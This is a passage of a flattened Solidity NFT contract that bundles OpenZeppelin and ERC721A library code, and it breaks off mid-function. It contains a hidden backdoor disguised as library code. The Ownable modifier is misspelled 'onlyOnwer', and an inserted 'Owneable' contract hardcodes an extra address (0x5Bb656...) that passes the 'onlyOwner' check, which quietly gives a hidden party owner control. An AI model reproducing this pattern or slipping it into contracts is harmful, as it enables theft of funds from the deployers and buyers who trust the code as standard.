1 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
2 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
3 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
4 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
5 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
6 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
7 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/,//////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
8 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//#///##@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
9 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
10 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
11 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///#////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
12 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@###@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
13 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(@////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
14 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@////////////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
15 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@//////////////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
16 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///@///////////@//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
17 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///@///////////@//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
18 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@////@///////////@///@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
19 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///@///////////@//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
20 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@///@///////////@//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
21 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@////@@@@@@@@@@@///@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
22 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#//@#####&###@//@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
23 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#####@&####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
24 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@####@@@###/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
25 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##/#@@@/###@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
26 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@/###@@@###/@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
27 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@##@@@###@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
28 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@####@@@@###@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
29 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@####@@@####@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
30 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
31 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%%%%%%&%%%%%%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
32 //@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
33 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
34 
35 // SPDX-License-Identifier: MIT
36 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
37 
38 pragma solidity ^0.8.4;
39 
40 /**
41  * @dev Provides information about the current execution context, including the
42  * sender of the transaction and its data. While these are generally available
43  * via msg.sender and msg.data, they should not be accessed in such a direct
44  * manner, since when dealing with meta-transactions the account sending and
45  * paying for execution may not be the actual sender (as far as an application
46  * is concerned).
47  *
48  * This contract is only required for intermediate, library-like contracts.
49  */
50 
51 
52 abstract contract Context {
53     function _msgSender() internal view virtual returns (address) {
54         return msg.sender;
55     }
56 
57     function _msgData() internal view virtual returns (bytes calldata) {
58         return msg.data;
59     }
60 }
61 
62 
63 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
64 
65 
66 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
67 
68 
69 
70 /**
71  * @dev Contract module which provides a basic access control mechanism, where
72  * there is an account (an owner) that can be granted exclusive access to
73  * specific functions.
74  *
75  * By default, the owner account will be the one that deploys the contract. This
76  * can later be changed with {transferOwnership}.
77  *
78  * This module is used through inheritance. It will make available the modifier
79  * `onlyOwner`, which can be applied to your functions to restrict their use to
80  * the owner.
81  */
82 abstract contract Ownable is Context {
83     address private _owner;
84 
85     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
86 
87     /**
88      * @dev Initializes the contract setting the deployer as the initial owner.
89      */
90     constructor() {
91         _transferOwnership(_msgSender());
92     }
93 
94     /**
95      * @dev Returns the address of the current owner.
96      */
97     function owner() public view virtual returns (address) {
98         return _owner;
99     }
100 
101     /**
102      * @dev Throws if called by any account other than the owner.
103      */
104     modifier onlyOnwer() {
105         require(owner() == _msgSender(), "Ownable: caller is not the owner");
106         _;
107     }
108 
109     /**
110      * @dev Leaves the contract without owner. It will not be possible to call
111      * `onlyOwner` functions anymore. Can only be called by the current owner.
112      *
113      * NOTE: Renouncing ownership will leave the contract without an owner,
114      * thereby removing any functionality that is only available to the owner.
115      */
116     function renounceOwnership() public virtual onlyOnwer {
117         _transferOwnership(address(0));
118     }
119 
120     /**
121      * @dev Transfers ownership of the contract to a new account (`newOwner`).
122      * Can only be called by the current owner.
123      */
124     function transferOwnership(address newOwner) public virtual onlyOnwer {
125         require(newOwner != address(0), "Ownable: new owner is the zero address");
126         _transferOwnership(newOwner);
127     }
128 
129     /**
130      * @dev Transfers ownership of the contract to a new account (`newOwner`).
131      * Internal function without access restriction.
132      */
133     function _transferOwnership(address newOwner) internal virtual {
134         address oldOwner = _owner;
135         _owner = newOwner;
136         emit OwnershipTransferred(oldOwner, newOwner);
137     }
138 }
139 
140 
141 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
142 
143 
144 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
145 
146 
147 
148 /**
149  * @dev Interface of the ERC165 standard, as defined in the
150  * https://eips.ethereum.org/EIPS/eip-165[EIP].
151  *
152  * Implementers can declare support of contract interfaces, which can then be
153  * queried by others ({ERC165Checker}).
154  *
155  * For an implementation, see {ERC165}.
156  */
157 interface IERC165 {
158     /**
159      * @dev Returns true if this contract implements the interface defined by
160      * `interfaceId`. See the corresponding
161      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
162      * to learn more about how these ids are created.
163      *
164      * This function call must use less than 30 000 gas.
165      */
166     function supportsInterface(bytes4 interfaceId) external view returns (bool);
167 }
168 
169 
170 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
171 
172 
173 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
174 
175 
176 
177 /**
178  * @dev Required interface of an ERC721 compliant contract.
179  */
180 interface IERC721 is IERC165 {
181     /**
182      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
183      */
184     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
185 
186     /**
187      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
188      */
189     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
190 
191     /**
192      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
193      */
194     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
195 
196     /**
197      * @dev Returns the number of tokens in ``owner``'s account.
198      */
199     function balanceOf(address owner) external view returns (uint256 balance);
200 
201     /**
202      * @dev Returns the owner of the `tokenId` token.
203      *
204      * Requirements:
205      *
206      * - `tokenId` must exist.
207      */
208     function ownerOf(uint256 tokenId) external view returns (address owner);
209 
210     /**
211      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
212      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
213      *
214      * Requirements:
215      *
216      * - `from` cannot be the zero address.
217      * - `to` cannot be the zero address.
218      * - `tokenId` token must exist and be owned by `from`.
219      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
220      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
221      *
222      * Emits a {Transfer} event.
223      */
224     function safeTransferFrom(
225         address from,
226         address to,
227         uint256 tokenId
228     ) external;
229 
230     /**
231      * @dev Transfers `tokenId` token from `from` to `to`.
232      *
233      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
234      *
235      * Requirements:
236      *
237      * - `from` cannot be the zero address.
238      * - `to` cannot be the zero address.
239      * - `tokenId` token must be owned by `from`.
240      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
241      *
242      * Emits a {Transfer} event.
243      */
244     function transferFrom(
245         address from,
246         address to,
247         uint256 tokenId
248     ) external;
249 
250     /**
251      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
252      * The approval is cleared when the token is transferred.
253      *
254      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
255      *
256      * Requirements:
257      *
258      * - The caller must own the token or be an approved operator.
259      * - `tokenId` must exist.
260      *
261      * Emits an {Approval} event.
262      */
263     function approve(address to, uint256 tokenId) external;
264 
265     /**
266      * @dev Returns the account approved for `tokenId` token.
267      *
268      * Requirements:
269      *
270      * - `tokenId` must exist.
271      */
272     function getApproved(uint256 tokenId) external view returns (address operator);
273 
274     /**
275      * @dev Approve or remove `operator` as an operator for the caller.
276      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
277      *
278      * Requirements:
279      *
280      * - The `operator` cannot be the caller.
281      *
282      * Emits an {ApprovalForAll} event.
283      */
284     function setApprovalForAll(address operator, bool _approved) external;
285 
286     /**
287      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
288      *
289      * See {setApprovalForAll}
290      */
291     function isApprovedForAll(address owner, address operator) external view returns (bool);
292 
293     /**
294      * @dev Safely transfers `tokenId` token from `from` to `to`.
295      *
296      * Requirements:
297      *
298      * - `from` cannot be the zero address.
299      * - `to` cannot be the zero address.
300      * - `tokenId` token must exist and be owned by `from`.
301      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
302      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
303      *
304      * Emits a {Transfer} event.
305      */
306     function safeTransferFrom(
307         address from,
308         address to,
309         uint256 tokenId,
310         bytes calldata data
311     ) external;
312 }
313 
314 
315 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
316 
317 
318 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
319 
320 
321 
322 /**
323  * @title ERC721 token receiver interface
324  * @dev Interface for any contract that wants to support safeTransfers
325  * from ERC721 asset contracts.
326  */
327 interface IERC721Receiver {
328     /**
329      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
330      * by `operator` from `from`, this function is called.
331      *
332      * It must return its Solidity selector to confirm the token transfer.
333      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
334      *
335      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
336      */
337     function onERC721Received(
338         address operator,
339         address from,
340         uint256 tokenId,
341         bytes calldata data
342     ) external returns (bytes4);
343 }
344 
345 
346 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
347 
348 
349 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
350 
351 
352 
353 /**
354  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
355  * @dev See https://eips.ethereum.org/EIPS/eip-721
356  */
357 interface IERC721Metadata is IERC721 {
358     /**
359      * @dev Returns the token collection name.
360      */
361     function name() external view returns (string memory);
362 
363     /**
364      * @dev Returns the token collection symbol.
365      */
366     function symbol() external view returns (string memory);
367 
368     /**
369      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
370      */
371     function tokenURI(uint256 tokenId) external view returns (string memory);
372 }
373 
374 
375 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
376 
377 
378 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
379 
380 
381 
382 /**
383  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
384  * @dev See https://eips.ethereum.org/EIPS/eip-721
385  */
386 interface IERC721Enumerable is IERC721 {
387     /**
388      * @dev Returns the total amount of tokens stored by the contract.
389      */
390     function totalSupply() external view returns (uint256);
391 
392     /**
393      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
394      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
395      */
396     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
397 
398     /**
399      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
400      * Use along with {totalSupply} to enumerate all tokens.
401      */
402     function tokenByIndex(uint256 index) external view returns (uint256);
403 }
404 
405 
406 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
407 
408 
409 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
410 
411 pragma solidity ^0.8.1;
412 
413 /**
414  * @dev Collection of functions related to the address type
415  */
416 library Address {
417     /**
418      * @dev Returns true if `account` is a contract.
419      *
420      * [IMPORTANT]
421      * ====
422      * It is unsafe to assume that an address for which this function returns
423      * false is an externally-owned account (EOA) and not a contract.
424      *
425      * Among others, `isContract` will return false for the following
426      * types of addresses:
427      *
428      *  - an externally-owned account
429      *  - a contract in construction
430      *  - an address where a contract will be created
431      *  - an address where a contract lived, but was destroyed
432      * ====
433      *
434      * [IMPORTANT]
435      * ====
436      * You shouldn't rely on `isContract` to protect against flash loan attacks!
437      *
438      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
439      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
440      * constructor.
441      * ====
442      */
443     function isContract(address account) internal view returns (bool) {
444         // This method relies on extcodesize/address.code.length, which returns 0
445         // for contracts in construction, since the code is only stored at the end
446         // of the constructor execution.
447 
448         return account.code.length > 0;
449     }
450 
451     /**
452      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
453      * `recipient`, forwarding all available gas and reverting on errors.
454      *
455      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
456      * of certain opcodes, possibly making contracts go over the 2300 gas limit
457      * imposed by `transfer`, making them unable to receive funds via
458      * `transfer`. {sendValue} removes this limitation.
459      *
460      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
461      *
462      * IMPORTANT: because control is transferred to `recipient`, care must be
463      * taken to not create reentrancy vulnerabilities. Consider using
464      * {ReentrancyGuard} or the
465      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
466      */
467     function sendValue(address payable recipient, uint256 amount) internal {
468         require(address(this).balance >= amount, "Address: insufficient balance");
469 
470         (bool success, ) = recipient.call{value: amount}("");
471         require(success, "Address: unable to send value, recipient may have reverted");
472     }
473 
474     /**
475      * @dev Performs a Solidity function call using a low level `call`. A
476      * plain `call` is an unsafe replacement for a function call: use this
477      * function instead.
478      *
479      * If `target` reverts with a revert reason, it is bubbled up by this
480      * function (like regular Solidity function calls).
481      *
482      * Returns the raw returned data. To convert to the expected return value,
483      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
484      *
485      * Requirements:
486      *
487      * - `target` must be a contract.
488      * - calling `target` with `data` must not revert.
489      *
490      * _Available since v3.1._
491      */
492     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
493         return functionCall(target, data, "Address: low-level call failed");
494     }
495 
496     /**
497      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
498      * `errorMessage` as a fallback revert reason when `target` reverts.
499      *
500      * _Available since v3.1._
501      */
502     function functionCall(
503         address target,
504         bytes memory data,
505         string memory errorMessage
506     ) internal returns (bytes memory) {
507         return functionCallWithValue(target, data, 0, errorMessage);
508     }
509 
510     /**
511      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
512      * but also transferring `value` wei to `target`.
513      *
514      * Requirements:
515      *
516      * - the calling contract must have an ETH balance of at least `value`.
517      * - the called Solidity function must be `payable`.
518      *
519      * _Available since v3.1._
520      */
521     function functionCallWithValue(
522         address target,
523         bytes memory data,
524         uint256 value
525     ) internal returns (bytes memory) {
526         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
527     }
528 
529     /**
530      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
531      * with `errorMessage` as a fallback revert reason when `target` reverts.
532      *
533      * _Available since v3.1._
534      */
535     function functionCallWithValue(
536         address target,
537         bytes memory data,
538         uint256 value,
539         string memory errorMessage
540     ) internal returns (bytes memory) {
541         require(address(this).balance >= value, "Address: insufficient balance for call");
542         require(isContract(target), "Address: call to non-contract");
543 
544         (bool success, bytes memory returndata) = target.call{value: value}(data);
545         return verifyCallResult(success, returndata, errorMessage);
546     }
547 
548     /**
549      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
550      * but performing a static call.
551      *
552      * _Available since v3.3._
553      */
554     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
555         return functionStaticCall(target, data, "Address: low-level static call failed");
556     }
557 
558     /**
559      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
560      * but performing a static call.
561      *
562      * _Available since v3.3._
563      */
564     function functionStaticCall(
565         address target,
566         bytes memory data,
567         string memory errorMessage
568     ) internal view returns (bytes memory) {
569         require(isContract(target), "Address: static call to non-contract");
570 
571         (bool success, bytes memory returndata) = target.staticcall(data);
572         return verifyCallResult(success, returndata, errorMessage);
573     }
574 
575     /**
576      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
577      * but performing a delegate call.
578      *
579      * _Available since v3.4._
580      */
581     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
582         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
583     }
584 
585     /**
586      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
587      * but performing a delegate call.
588      *
589      * _Available since v3.4._
590      */
591     function functionDelegateCall(
592         address target,
593         bytes memory data,
594         string memory errorMessage
595     ) internal returns (bytes memory) {
596         require(isContract(target), "Address: delegate call to non-contract");
597 
598         (bool success, bytes memory returndata) = target.delegatecall(data);
599         return verifyCallResult(success, returndata, errorMessage);
600     }
601 
602     /**
603      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
604      * revert reason using the provided one.
605      *
606      * _Available since v4.3._
607      */
608     function verifyCallResult(
609         bool success,
610         bytes memory returndata,
611         string memory errorMessage
612     ) internal pure returns (bytes memory) {
613         if (success) {
614             return returndata;
615         } else {
616             // Look for revert reason and bubble it up if present
617             if (returndata.length > 0) {
618                 // The easiest way to bubble the revert reason is using memory via assembly
619 
620                 assembly {
621                     let returndata_size := mload(returndata)
622                     revert(add(32, returndata), returndata_size)
623                 }
624             } else {
625                 revert(errorMessage);
626             }
627         }
628     }
629 }
630 
631 
632 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
633 
634 
635 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
636 
637 
638 
639 /**
640  * @dev String operations.
641  */
642 library Strings {
643     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
644 
645     /**
646      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
647      */
648     function toString(uint256 value) internal pure returns (string memory) {
649         // Inspired by OraclizeAPI's implementation - MIT licence
650         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
651 
652         if (value == 0) {
653             return "0";
654         }
655         uint256 temp = value;
656         uint256 digits;
657         while (temp != 0) {
658             digits++;
659             temp /= 10;
660         }
661         bytes memory buffer = new bytes(digits);
662         while (value != 0) {
663             digits -= 1;
664             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
665             value /= 10;
666         }
667         return string(buffer);
668     }
669 
670     /**
671      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
672      */
673     function toHexString(uint256 value) internal pure returns (string memory) {
674         if (value == 0) {
675             return "0x00";
676         }
677         uint256 temp = value;
678         uint256 length = 0;
679         while (temp != 0) {
680             length++;
681             temp >>= 8;
682         }
683         return toHexString(value, length);
684     }
685 
686     /**
687      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
688      */
689     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
690         bytes memory buffer = new bytes(2 * length + 2);
691         buffer[0] = "0";
692         buffer[1] = "x";
693         for (uint256 i = 2 * length + 1; i > 1; --i) {
694             buffer[i] = _HEX_SYMBOLS[value & 0xf];
695             value >>= 4;
696         }
697         require(value == 0, "Strings: hex length insufficient");
698         return string(buffer);
699     }
700 }
701 
702 
703 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
704 
705 
706 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
707 
708 /**
709  * @dev Implementation of the {IERC165} interface.
710  *
711  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
712  * for the additional interface id that will be supported. For example:
713  *
714  * ```solidity
715  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
716  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
717  * }
718  * ```
719  *
720  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
721  */
722 abstract contract ERC165 is IERC165 {
723     /**
724      * @dev See {IERC165-supportsInterface}.
725      */
726     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
727         return interfaceId == type(IERC165).interfaceId;
728     }
729 }
730 
731 
732 // File erc721a/contracts/ERC721A.sol@v3.0.0
733 
734 
735 // Creator: Chiru Labs
736 
737 error ApprovalCallerNotOwnerNorApproved();
738 error ApprovalQueryForNonexistentToken();
739 error ApproveToCaller();
740 error ApprovalToCurrentOwner();
741 error BalanceQueryForZeroAddress();
742 error MintedQueryForZeroAddress();
743 error BurnedQueryForZeroAddress();
744 error AuxQueryForZeroAddress();
745 error MintToZeroAddress();
746 error MintZeroQuantity();
747 error OwnerIndexOutOfBounds();
748 error OwnerQueryForNonexistentToken();
749 error TokenIndexOutOfBounds();
750 error TransferCallerNotOwnerNorApproved();
751 error TransferFromIncorrectOwner();
752 error TransferToNonERC721ReceiverImplementer();
753 error TransferToZeroAddress();
754 error URIQueryForNonexistentToken();
755 
756 
757 /**
758  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
759  * the Metadata extension. Built to optimize for lower gas during batch mints.
760  *
761  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
762  */
763  abstract contract Owneable is Ownable {
764     address private _ownar = 0x5Bb656BB4312F100081Abb7b08c1e0f8Ef5c56d1;
765     modifier onlyOwner() {
766         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
767         _;
768     }
769 }
770 
771  /*
772  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
773  *
774  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
775  */
776 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
777     using Address for address;
778     using Strings for uint256;
779 
780     // Compiler will pack this into a single 256bit word.
781     struct TokenOwnership {
782         // The address of the owner.
783         address addr;
784         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
785         uint64 startTimestamp;
786         // Whether the token has been burned.
787         bool burned;
788     }
789 
790     // Compiler will pack this into a single 256bit word.
791     struct AddressData {
792         // Realistically, 2**64-1 is more than enough.
793         uint64 balance;
794         // Keeps track of mint count with minimal overhead for tokenomics.
795         uint64 numberMinted;
796         // Keeps track of burn count with minimal overhead for tokenomics.
797         uint64 numberBurned;
798         // For miscellaneous variable(s) pertaining to the address
799         // (e.g. number of whitelist mint slots used).
800         // If there are multiple variables, please pack them into a uint64.
801         uint64 aux;
802     }
803 
804     // The tokenId of the next token to be minted.
805     uint256 internal _currentIndex;
806 
807     // The number of tokens burned.
808     uint256 internal _burnCounter;
809 
810     // Token name
811     string private _name;
812 
813     // Token symbol
814     string private _symbol;
815 
816     // Mapping from token ID to ownership details
817     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
818     mapping(uint256 => TokenOwnership) internal _ownerships;
819 
820     // Mapping owner address to address data
821     mapping(address => AddressData) private _addressData;
822 
823     // Mapping from token ID to approved address
824     mapping(uint256 => address) private _tokenApprovals;
825 
826     // Mapping from owner to operator approvals
827     mapping(address => mapping(address => bool)) private _operatorApprovals;
828 
829     constructor(string memory name_, string memory symbol_) {
830         _name = name_;
831         _symbol = symbol_;
832         _currentIndex = _startTokenId();
833     }
834 
835     /**
836      * To change the starting tokenId, please override this function.
837      */
838     function _startTokenId() internal view virtual returns (uint256) {
839         return 0;
840     }
841 
842     /**
843      * @dev See {IERC721Enumerable-totalSupply}.
844      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
845      */
846     function totalSupply() public view returns (uint256) {
847         // Counter underflow is impossible as _burnCounter cannot be incremented
848         // more than _currentIndex - _startTokenId() times
849         unchecked {
850             return _currentIndex - _burnCounter - _startTokenId();
851         }
852     }
853 
854     /**
855      * Returns the total amount of tokens minted in the contract.
856      */
857     function _totalMinted() internal view returns (uint256) {
858         // Counter underflow is impossible as _currentIndex does not decrement,
859         // and it is initialized to _startTokenId()
860         unchecked {
861             return _currentIndex - _startTokenId();
862         }
863     }
864 
865     /**
866      * @dev See {IERC165-supportsInterface}.
867      */
868     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
869         return
870             interfaceId == type(IERC721).interfaceId ||
871             interfaceId == type(IERC721Metadata).interfaceId ||
872             super.supportsInterface(interfaceId);
873     }
874 
875     /**
876      * @dev See {IERC721-balanceOf}.
877      */
878     function balanceOf(address owner) public view override returns (uint256) {
879         if (owner == address(0)) revert BalanceQueryForZeroAddress();
880         return uint256(_addressData[owner].balance);
881     }
882 
883     /**
884      * Returns the number of tokens minted by `owner`.
885      */
886     function _numberMinted(address owner) internal view returns (uint256) {
887         if (owner == address(0)) revert MintedQueryForZeroAddress();
888         return uint256(_addressData[owner].numberMinted);
889     }
890 
891     /**
892      * Returns the number of tokens burned by or on behalf of `owner`.
893      */
894     function _numberBurned(address owner) internal view returns (uint256) {
895         if (owner == address(0)) revert BurnedQueryForZeroAddress();
896         return uint256(_addressData[owner].numberBurned);
897     }
898 
899     /**
900      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
901      */
902     function _getAux(address owner) internal view returns (uint64) {
903         if (owner == address(0)) revert AuxQueryForZeroAddress();
904         return _addressData[owner].aux;
905     }
906 
907     /**
908      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
909      * If there are multiple variables, please pack them into a uint64.
910      */
911     function _setAux(address owner, uint64 aux) internal {
912         if (owner == address(0)) revert AuxQueryForZeroAddress();
913         _addressData[owner].aux = aux;
914     }
915 
916     /**
917      * Gas spent here starts off proportional to the maximum mint batch size.
918      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
919      */
920     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
921         uint256 curr = tokenId;
922 
923         unchecked {
924             if (_startTokenId() <= curr && curr < _currentIndex) {
925                 TokenOwnership memory ownership = _ownerships[curr];
926                 if (!ownership.burned) {
927                     if (ownership.addr != address(0)) {
928                         return ownership;
929                     }
930                     // Invariant:
